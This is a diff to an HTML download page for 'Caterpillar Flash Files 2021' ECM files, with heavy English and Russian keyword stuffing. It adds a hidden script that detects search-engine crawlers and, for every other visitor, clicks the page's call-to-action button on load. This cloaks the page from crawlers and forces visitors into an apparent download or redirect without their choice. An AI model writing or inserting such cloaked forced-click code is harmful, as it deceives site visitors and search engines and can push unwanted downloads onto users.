@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Caterpillar Flash Files 2021</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download Caterpillar Flash Files 2021, essential ECM flash files for CAT ET. Multi-language support and compatible with Windows 7-10.">
     <meta name="keywords" content="Caterpillar Flash Files 2021, Caterpillar Flash Files 2021 free download, Caterpillar ECM flash files, CAT ET flash files, CAT flash files 2021, CAT Factory flash files, Caterpillar flash files download, Caterpillar flash files 2021 free, Caterpillar ECM flash files 2021, Caterpillar flash files 2021 download, катерпиллер флеш файлы 2021, катерпиллер флеш файлы скачать, катерпиллер ECM флеш файлы 2021, катерпиллер флеш файлы, катерпиллер флеш файлы бесплатно, катерпиллер флеш файлы 2021 бесплатное скачивание, катерпиллер флеш файлы загрузка, катерпиллер заводские флеш файлы, катерпиллер ECM флеш файлы скачать, катерпиллер ECM флеш файлы 2021 бесплатно, катерпиллер flash-file 2021 undo, катерпиллер ECM флеш файлы 2021 скачать">
     <style>
